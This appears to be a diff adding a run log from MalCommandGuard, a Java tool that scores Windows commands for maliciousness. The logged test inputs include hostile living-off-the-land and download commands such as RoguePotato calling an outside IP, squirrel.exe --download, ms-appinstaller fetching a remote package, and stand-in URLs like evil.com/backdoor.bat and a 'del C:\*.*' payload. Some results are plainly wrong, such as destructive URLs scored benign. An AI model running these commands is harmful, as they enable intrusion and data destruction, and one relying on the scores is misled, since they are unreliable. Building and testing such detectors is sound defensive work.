@@ -1,0 +1,450 @@
+Jul 02, 2025 5:19:30 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 5:30:06 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 5:30:30 PM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: jeniffer (USER)
+Jul 02, 2025 5:30:43 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 02, 2025 5:31:28 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: tracert google.com | Classification: BENIGN | Score: 0.2000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: tracert | History: none
+Jul 02, 2025 5:32:30 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p | Classification: MALICIOUS | Score: 0.6500 | Lolbin: svchost.exe | Content: C:\Windows\System32\svchost.exe | Frequency: none | Source: C:\Windows\System32\svchost.exe | Network: none | Behavioural: -k,LocalSystemNetworkRestricted,-p | History: none
+Jul 02, 2025 5:32:49 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: telnet 10.10.10.10 80 | Classification: BENIGN | Score: 0.1500 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: 10.10.10.10:80 | Behavioural: telnet | History: none
+Jul 02, 2025 5:33:05 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: telnet hostname.domain.com 80 | Classification: BENIGN | Score: 0.1500 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: hostname.domain.com:80 | Behavioural: telnet | History: none
+Jul 02, 2025 5:33:20 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: \.Watson.exe | Classification: BENIGN | Score: 0.0500 | Lolbin: Watson.exe | Content: none | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 5:33:41 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: .\RoguePotato.exe -r 10.10.14.9 -e "cmd.exe /c ping 10.10.14.9" -l 9999 | Classification: MALICIOUS | Score: 0.6000 | Lolbin: RoguePotato.exe | Content: cmd.exe | Frequency: none | Source: none | Network: 10.10.14.9,9999 | Behavioural: -r,-e | History: none
+Jul 02, 2025 5:33:58 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1 | Classification: SUSPICIOUS | Score: 0.5500 | Lolbin: powershell | Content: C:\Users\Rasta\Desktop\Sherlock.ps1 | Frequency: none | Source: none | Network: none | Behavioural: powershell-import | History: none
+Jul 02, 2025 5:36:17 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: jeniffer
+Jul 02, 2025 5:36:32 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:36:43 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:36:43 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Login locked after 3 failed attempts
+Jul 02, 2025 5:37:24 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:37:34 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:37:44 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:37:44 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Login locked after 3 failed attempts
+Jul 02, 2025 5:43:25 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 5:43:38 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:43:45 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:43:51 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 5:43:51 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Login locked after 3 failed attempts
+Jul 02, 2025 5:44:06 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 02, 2025 6:26:27 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:26:40 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 6:26:51 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 6:32:26 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:32:47 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 02, 2025 6:33:17 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: ping google.com | Classification: BENIGN | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: none | History: none
+Jul 02, 2025 6:33:28 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: powershell Get-DomainUser | select -ExpandProperty cn | Classification: BENIGN | Score: 0.1500 | Lolbin: powershell | Content: none | Frequency: none | Source: none | Network: none | Behavioural: Get-DomainUser,select,-ExpandProperty | History: none
+Jul 02, 2025 6:34:20 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: jsc.exe scriptfile.js | Classification: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 6:34:28 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 02, 2025 6:34:37 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: jeniffer
+Jul 02, 2025 6:34:42 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 6:35:27 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:36:04 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 6:36:31 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: squirrel.exe --download [http://11.1.1.1] | Classification: MALICIOUS | Score: 0.7500 | Lolbin: squirrel.exe | Content: http://11.1.1.1 | Frequency: none | Source: http://11.1.1.1 | Network: 11.1.1.1 | Behavioural: --download | History: none
+Jul 02, 2025 6:36:47 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: pcalua.exe -a calc.exe | Classification: SUSPICIOUS | Score: 0.5500 | Lolbin: pcalua.exe | Content: calc.exe | Frequency: none | Source: none | Network: none | Behavioural: -a | History: none
+Jul 02, 2025 6:37:07 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: whoami /groups | Classification: BENIGN | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: whoami /groups | History: none
+Jul 02, 2025 6:38:15 PM malcommandguard.MalCommandGuard exportAnalysisLogs
+INFO: Analysis logs exported by: admin
+Jul 02, 2025 6:42:45 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 6:44:47 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:45:32 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 6:45:56 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://mail.google.com/mail/u/0/?pli=1#inbox | Classification: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: unknown command | Frequency: uncommon | Source: user input | Network: none | Behavioural: new command | History: none
+Jul 02, 2025 6:47:04 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://update-security-check.com | Classification: BENIGN | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: date | History: none
+Jul 02, 2025 6:47:13 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://malicious-site.com/malware.exe | Classification: SUSPICIOUS | Score: 0.7500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 02, 2025 6:47:34 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://evil.com/cmd?run=del%20C:\\*.* | Classification: BENIGN | Score: 0.0500 | Lolbin: cmd | Content: none | Frequency: none | Source: none | Network: none | Behavioural: cmd | History: none
+Jul 02, 2025 6:48:29 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 02, 2025 6:48:39 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: pcalua.exe -a calc.exe | Classification: SUSPICIOUS | Score: 0.5500 | Lolbin: pcalua.exe | Content: calc.exe | Frequency: none | Source: none | Network: none | Behavioural: -a | History: none
+Jul 02, 2025 6:48:47 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: ping google.com | Classification: BENIGN | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: none | History: none
+Jul 02, 2025 6:49:38 PM malcommandguard.MalCommandGuard exportAnalysisLogs
+INFO: Analysis logs exported by: admin
+Jul 02, 2025 6:51:57 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 02, 2025 6:52:00 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 6:52:06 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:52:40 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 6:52:54 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 6:52:54 PM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 02, 2025 6:53:03 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 6:54:39 PM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: lucyliu (USER)
+Jul 02, 2025 7:47:27 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 7:47:47 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: admin
+Jul 02, 2025 7:48:06 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: user
+Jul 02, 2025 7:56:19 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 7:56:34 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 7:57:11 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: squirrel.exe --download [http://11.1.1.1] | Classification: MALICIOUS | Score: 0.7500 | Lolbin: squirrel.exe | Content: http://11.1.1.1 | Frequency: none | Source: http://11.1.1.1 | Network: 11.1.1.1 | Behavioural: --download | History: none
+Jul 02, 2025 7:57:22 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: rundll32.exe syssetup.dll | Classification: SUSPICIOUS | Score: 0.4500 | Lolbin: rundll32.exe | Content: syssetup.dll | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 7:57:56 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: ie4uinit.exe -BaseSettings | Classification: BENIGN | Score: 0.1500 | Lolbin: ie4uinit.exe | Content: none | Frequency: none | Source: none | Network: none | Behavioural: -BaseSettings | History: none
+Jul 02, 2025 7:58:13 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: whoami /groups | Classification: BENIGN | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: whoami /groups | History: none
+Jul 02, 2025 7:58:22 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: ie4uinit.exe -BaseSettings | Classification: BENIGN | Score: 0.1500 | Lolbin: ie4uinit.exe | Content: none | Frequency: none | Source: none | Network: none | Behavioural: -BaseSettings | History: none
+Jul 02, 2025 7:59:21 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 02, 2025 7:59:30 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: user (USER)
+Jul 02, 2025 8:13:43 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 8:13:55 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 8:14:19 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 02, 2025 8:14:39 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: ping google.com | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: none | History: none
+Jul 02, 2025 8:15:07 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 8:15:23 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 02, 2025 8:25:27 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 8:25:39 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 8:26:03 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: sqldumper.exe 464 0 0x0110 | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: sqldumper.exe | Content: 464 | Frequency: none | Source: 0x0110 | Network: none | Behavioural: none | History: none
+Jul 02, 2025 8:26:26 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 8:54:29 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 8:54:40 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 8:55:16 PM malcommandguard.MalCommandGuard main
+INFO: Application terminated
+Jul 02, 2025 9:05:19 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 9:05:39 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: admin
+Jul 02, 2025 9:06:10 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: user
+Jul 02, 2025 9:06:26 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 9:06:59 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 02, 2025 9:07:26 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: whoami /groups | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: whoami /groups | History: none
+Jul 02, 2025 9:07:44 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: Regsvr32 ..\Kro.fis2 | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.6000 | Lolbin: Regsvr32 | Content: Kro.fis2 | Frequency: none | Source: ..\Kro.fis2 | Network: none | Behavioural: none | History: Mitre Attack
+Jul 02, 2025 9:08:01 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: rundll32.exe syssetup.dll | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: rundll32.exe | Content: syssetup.dll | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 9:10:44 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: admin
+Jul 02, 2025 9:11:15 PM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: jeniffer (USER)
+Jul 02, 2025 9:11:38 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 9:11:48 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 9:11:58 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: jeniffer
+Jul 02, 2025 9:11:58 PM malcommandguard.MalCommandGuard performLogin
+SEVERE: Security lockout triggered after 3 failed attempts - System exit
+Jul 02, 2025 9:35:56 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 02, 2025 9:36:14 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 02, 2025 9:36:36 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: rundll32.exe syssetup.dll | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: rundll32.exe | Content: syssetup.dll | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 02, 2025 9:36:51 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: squirrel.exe --download [http://11.1.1.1] | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: squirrel.exe | Content: http://11.1.1.1 | Frequency: none | Source: http://11.1.1.1 | Network: 11.1.1.1 | Behavioural: --download | History: none
+Jul 02, 2025 9:39:48 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: squirrel.exe --download [http://11.1.1.1] | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: squirrel.exe | Content: http://11.1.1.1 | Frequency: none | Source: http://11.1.1.1 | Network: 11.1.1.1 | Behavioural: --download | History: none
+Jul 02, 2025 9:40:17 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: ping whatsapp.com | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 03, 2025 2:56:57 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 03, 2025 2:57:26 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 03, 2025 2:58:22 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 03, 2025 2:58:54 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: ping google.com | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: none | History: none
+Jul 03, 2025 3:16:51 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 03, 2025 3:17:16 PM malcommandguard.MalCommandGuard performLogin
+WARNING: Failed login attempt for: admin
+Jul 03, 2025 3:17:43 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 03, 2025 3:17:56 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: ping google.com | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: google.com | Behavioural: none | History: none
+Jul 03, 2025 3:18:06 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: sqldumper.exe 464 0 0x0110 | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: sqldumper.exe | Content: 464 | Frequency: none | Source: 0x0110 | Network: none | Behavioural: none | History: none
+Jul 03, 2025 3:18:16 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: jeniffer | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 03, 2025 3:19:14 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: jeniffer
+Jul 03, 2025 3:20:19 PM malcommandguard.MalCommandGuard performRegistration
+INFO: New user registered: newuser (USER)
+Jul 03, 2025 3:47:35 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: jeniffer (USER)
+Jul 03, 2025 3:48:48 PM malcommandguard.MalCommandGuard runMainLoop
+INFO: User logged out: jeniffer
+Jul 03, 2025 3:49:08 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 05, 2025 9:32:35 PM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 05, 2025 9:32:54 PM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 05, 2025 9:33:22 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: sqldumper.exe 464 0 0x0110 | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.5500 | Lolbin: sqldumper.exe | Content: 464 | Frequency: none | Source: 0x0110 | Network: none | Behavioural: none | History: none
+Jul 05, 2025 9:34:00 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://attack.net/cmd.php?exec=net%20user | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: cmd | Content: none | Frequency: none | Source: none | Network: none | Behavioural: cmd | History: none
+Jul 05, 2025 9:34:23 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://evil.com/backdoor.bat | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.9000 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:34:33 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://attack.net/cmd.php?exec=net%20user | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: cmd | Content: none | Frequency: none | Source: none | Network: none | Behavioural: cmd | History: none
+Jul 05, 2025 9:34:52 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://192.168.1.100/payload.exe | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.9500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:34:59 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://pastebin.com/raw/abc123\ | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.6500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:35:47 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://bit.ly/suspicious-link | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.6000 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:35:55 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: http://10.0.0.1:8080/admin | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.7000 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:36:03 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://www.microsoft.com/security | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:36:11 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://docs.oracle.com/javas | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0500 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 05, 2025 9:36:18 PM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: https://github.com/apache/poi | Classification: legitimate | DisplayedAs: LEGITIMATE | Score: 0.0800 | Lolbin: rule-based | Content: pattern match | Frequency: analysis | Source: command | Network: detected | Behavioural: behavioral | History: none
+Jul 06, 2025 1:01:40 AM malcommandguard.MalCommandGuard setupLogging
+INFO: === MalCommandGuard CLI Started ===
+Jul 06, 2025 1:01:51 AM malcommandguard.MalCommandGuard performLogin
+INFO: User logged in: admin (ADMIN)
+Jul 06, 2025 1:02:04 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: dxdiag | Classification: benign | DisplayedAs: LEGITIMATE | Score: 0.1000 | Lolbin: none | Content: none | Frequency: none | Source: none | Network: none | Behavioural: dxdiag | History: none
+Jul 06, 2025 1:02:10 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: jsc.exe scriptfile.js | Classification: suspicious | DisplayedAs: SUSPICIOUS | Score: 0.4500 | Lolbin: jsc.exe | Content: scriptfile.js | Frequency: none | Source: none | Network: none | Behavioural: none | History: none
+Jul 06, 2025 1:02:28 AM malcommandguard.MalCommandGuard displayDetailedResult
+INFO: DETAILED_ANALYSIS | User: admin | Command: start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw | Classification: malicious | DisplayedAs: MALICIOUS | Score: 0.7500 | Lolbin: ms-appinstaller | Content: https://11.101.10.10/raw/tdyShwLw | Frequency: none | Source: source=https://11.101.10.10/raw/tdyShwLw | Network: 11.101.10.10 | Behavioural: start | History: none
+Jul 06, 2025 1:02:38 AM malcommandguard.MalCommandGuard displayDetailedResult
